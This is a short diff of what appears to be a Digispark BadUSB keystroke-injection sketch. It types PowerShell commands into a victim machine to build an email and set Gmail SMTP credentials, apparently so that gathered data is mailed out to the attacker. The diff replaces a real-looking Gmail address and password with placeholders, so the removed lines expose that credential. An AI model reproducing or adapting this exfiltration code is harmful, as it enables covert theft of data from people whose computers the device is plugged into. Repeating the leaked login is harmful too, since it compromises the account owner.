@@ -36,7 +36,7 @@ void loop() {
     DigiKeyboard.delay(1000);
 
     //sendMail
-    DigiKeyboard.print(F("$Message = New-Object System.Net.Mail.MailMessage 'elazelbinahras@gmail.com','elazelbinahras@gmail.com'"));
+    DigiKeyboard.print(F("$Message = New-Object System.Net.Mail.MailMessage 'yourmail@gmail.com','yourmail@gmail.com'"));
     DigiKeyboard.delay(1000);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(1000);
@@ -64,7 +64,7 @@ void loop() {
     DigiKeyboard.delay(1000);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(1000);
-    DigiKeyboard.print(F("$Smtp.Credentials = New-Object System.Net.NetworkCredential('elazelbinahras@gmail.com', 'Tayyonn1')"));
+    DigiKeyboard.print(F("$Smtp.Credentials = New-Object System.Net.NetworkCredential('yourmail@gmail.com', 'yourmailpass')"));
     DigiKeyboard.delay(1000);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(1000);
